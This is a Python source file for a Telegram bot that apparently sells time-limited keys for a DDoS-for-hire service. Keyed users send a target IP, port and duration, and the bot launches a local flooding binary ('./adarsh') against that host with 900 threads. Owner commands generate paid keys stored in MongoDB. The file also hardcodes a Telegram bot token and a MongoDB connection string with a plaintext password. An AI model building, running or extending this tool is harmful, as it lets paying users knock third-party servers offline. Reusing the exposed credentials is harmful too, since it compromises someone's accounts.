import telebot
import subprocess
import threading
import os
import signal
import copy
from datetime import datetime, timedelta, timezone
from pymongo import MongoClient
from keep_alive import keep_alive
keep_alive()

BOT_TOKEN = "8026059055:AAE9J_EvjCE2ZVAiHSpexWgpobd-iKAzirU"
bot = telebot.TeleBot(BOT_TOKEN)

# MONGO
MONGO_URI = "mongodb+srv://loomjoom07_db_user:nana12@cluster0.ietahh1.mongodb.net/?appName=Cluster0/"
client = MongoClient(MONGO_URI)
db = client['KEY_DB']
keys_col = db['keys']

# OWNER ID
OWNER_ID = 7646520243

# Groups allowed
ALLOWED_GROUPS = {"-1002382674139"}
REQUIRED_CHANNELS = ["@BADMOSH10"]

feedback_pending = {}
attack_processes = {}
attack_owners = {}
attack_running = False

# =====================
# CHANNEL CHECK
# =====================
def is_member(user_id):
    for ch in REQUIRED_CHANNELS:
        try:
            mem = bot.get_chat_member(ch, user_id)
            if mem.status not in ["member","administrator","creator"]:
                return False
        except:
            return False
    return True

# =====================
# REMAINING TIME FORMAT
# =====================
def format_remaining(exp):
    now = datetime.now(timezone.utc)
    diff = exp - now
    if diff.total_seconds() <= 0:
        return "Expired"
    s = int(diff.total_seconds())

    d = s // 86400
    h = (s % 86400) // 3600
    m = (s % 3600) // 60
    sec = s % 60

    if d > 1:
        return f"{d} days {h} hrs"
    if d == 1:
        return f"1 day {h} hrs"
    if h >= 1:
        return f"{h} hrs {m} min"
    if m >= 1:
        return f"{m} min {sec} sec"
    return f"{sec} sec"

# =====================
# KEY CHECK
# =====================
def has_valid_key(uid):
    user = keys_col.find_one({"user_id": uid})
    if not user:
        return False, None
    exp = user['expiry']
    if exp <= datetime.now(timezone.utc):
        return False, None
    return True, exp

# =====================
# OWNER — /gen KEY
# =====================
@bot.message_handler(commands=['gen'])
def gen_key(message):
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can generate keys.")
        return

    p = message.text.split()
    if len(p) != 4:
        bot.reply_to(message, "Usage: /gen m 1 1")
        return

    _, typ, amount, count = p
    amount = int(amount)
    count = int(count)

    if typ == "m":
        exp_time = timedelta(minutes=amount)
    elif typ == "h":
        exp_time = timedelta(hours=amount)
    elif typ == "d":
        exp_time = timedelta(days=amount)
    else:
        bot.reply_to(message, "❌ Wrong type. Use m/h/d")
        return

    keys_list = []
    for _ in range(count):
        k = os.urandom(4).hex()
        expire_at = datetime.now(timezone.utc) + exp_time

        keys_col.insert_one({
            "key": k,
            "expiry": expire_at,
            "activated": False,
            "user_id": None
        })
        keys_list.append(k)

    bot.reply_to(message, "Generated Keys:\n" + "\n".join(keys_list))

# =====================
# USER — USE KEY
# =====================
@bot.message_handler(commands=['usekey'])
def use_key(message):
    uid = message.from_user.id
    p = message.text.split()
    if len(p) != 2:
        bot.reply_to(message, "Usage: /usekey <key>")
        return

    key = p[1]
    k = keys_col.find_one({"key": key})

    if not k:
        bot.reply_to(message, "❌ Invalid key.")
        return
    if k['activated']:
        bot.reply_to(message, "❌ Already used.")
        return
    if k['expiry'] <= datetime.now(timezone.utc):
        bot.reply_to(message, "❌ Key expired.")
        return

    keys_col.update_one({"key": key}, {"$set": {"activated": True, "user_id": uid}})
    bot.reply_to(message, "✅ Key Activated! You can use bot now.")

# =====================
# START — OWNER / USER DIFFERENT
# =====================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    uid = message.from_user.id

    if uid == OWNER_ID:
        bot.reply_to(message, 
        "OWNER MENU:\n"
        "/chodo\n"
        "/ruko\n"
        "/gen\n"
        "/usekey\n"
        "/help\n")
        return

    valid, exp = has_valid_key(uid)
    if not valid:
        bot.reply_to(message,
            "❌ Permission Denied.\nBuy key: @me\nJoin: @BADMOSH10")
        return

    rem = format_remaining(exp)
    bot.reply_to(message, f"⏳ Remaining: {rem}\nUse: /chodo /help")

# =====================
# ATTACK SYSTEM (UNCHANGED)
# =====================
def start_attack(target, port, duration, message):
    global attack_running
    chat_id = str(message.chat.id)

    try:
        bot.reply_to(message, f"Attack start {target}:{port}")
        cmd = f"{os.path.abspath('./adarsh')} {target} {port} {duration} 900"
        p = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)

        attack_processes[chat_id] = p
        attack_running = True
        p.wait()
        bot.reply_to(message, "Completed")

    except Exception as e:
        bot.reply_to(message, str(e))

    finally:
        attack_processes.pop(chat_id, None)
        attack_running = False

# =====================
# /chodo — OWNER + USERS WITH KEY
# =====================
@bot.message_handler(commands=['chodo'])
def attack_cmd(message):
    uid = message.from_user.id
    chat_id = str(message.chat.id)

    if chat_id not in ALLOWED_GROUPS:
        bot.reply_to(message, "❌ Group only")
        return

    ok, exp = has_valid_key(uid)
    if not ok:
        bot.reply_to(message, "❌ Key expired. Buy @me")
        return

    p = message.text.split()
    if len(p) != 4:
        bot.reply_to(message, "Usage: /chodo <ip> <port> <time>")
        return

    target, port, dur = p[1], int(p[2]), int(p[3])

    max_t = 200
    if dur > max_t:
        bot.reply_to(message, f"Max {max_t}s allowed")
        return

    t = threading.Thread(target=start_attack, args=(target, port, dur, copy.deepcopy(message)))
    t.start()

# =====================
# /ruko — ANYONE WITH KEY
# =====================
@bot.message_handler(commands=['ruko'])
def stop_attack(message):
    chat_id = str(message.chat.id)
    if chat_id not in attack_processes:
        bot.reply_to(message, "No attack running")
        return

    try:
        p = attack_processes[chat_id]
        os.killpg(os.getpgid(p.pid), signal.SIGINT)
        bot.reply_to(message, "Stopped")
    except:
        bot.reply_to(message, "Error")

    attack_processes.pop(chat_id, None)
    global attack_running
    attack_running = False

# =====================
# HELP
# =====================
@bot.message_handler(commands=['help'])
def help_cmd(message):
    bot.reply_to(message, "Commands: /start /chodo /ruko /usekey")

# =====================
# BOT START
# =====================
bot.polling(none_stop=True)